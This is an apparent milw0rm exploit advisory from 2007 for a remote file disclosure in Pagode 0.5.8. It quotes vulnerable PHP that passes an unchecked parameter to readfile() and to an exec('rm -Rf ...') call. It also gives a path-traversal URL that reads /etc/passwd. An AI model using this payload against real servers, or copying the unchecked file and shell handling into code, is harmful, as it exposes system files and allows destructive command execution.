@@ -1,0 +1,23 @@
+# Pagode 0.5.8(navigator_ok.php asolute)Remote File Disclosure
+# D.Script:http://belnet.dl.sourceforge.net/sourceforge/pagode/pagode-0.5.8.tar.gz
+# Discovered by: GolD_M = [Mahmood_ali]
+# Homepage: http://www.Tryag.cc
+# V.Code In /navigator/navigator_ok.php: 
+###################/navigator/navigator_ok.php###################
+#  <?
+#  	session_cache_limiter('none');
+#	session_start();
+#	include ('../includes/functions.php');
+#
+#	header("Content-Type: application/save-as");
+#	header("Content-Length: $file_size");
+#	header("Content-Disposition: attachment; filename=$file_name");
+#	header("Content-Transfer-Encoding: binary");
+#	readfile($asolute); <----[+]
+#	exec("rm -Rf $asolute");
+#  ?>
+#################################################################
+# Exploit:[Path_Pagode]/navigator/navigator_ok.php?asolute=../../../../../../etc/passwd
+# Greetz To: Tryag-Team & 4lKaSrGoLd3n-Team & AsbMay's Group & 020
+
+# milw0rm.com [2007-04-23]
